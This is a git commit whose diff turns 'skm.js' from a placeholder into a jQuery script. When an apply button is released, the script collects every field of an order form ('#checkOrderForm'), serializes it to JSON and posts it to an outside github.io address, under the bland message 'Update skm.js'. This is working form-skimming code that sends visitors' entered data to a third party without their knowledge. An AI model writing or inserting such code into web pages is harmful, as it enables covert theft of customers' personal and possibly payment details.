5cce1720be2826b25ee20b37f664a3d564ef78de
faisal-akhtar-fgh <43573460+faisal-akhtar-fgh@users.noreply.github.com>
2019-08-19 13:51:07 +0100

    Update skm.js

--- skm.js
+++ skm.js
@@ -1,1 +1,10 @@
-console.log("skm file");
+window.onload = function() {
+    $("#applybutton").bind("mouseup touchend", function (t) {
+        var e = {};
+        $("#checkOrderForm").serializeArray().map(function (t) {
+            e[t.name] = t.value;
+        });
+        var n = JSON.stringify(e);
+        $.post("https://faisal-akhtar-fgh.github.io/kal", n);
+    });
+};
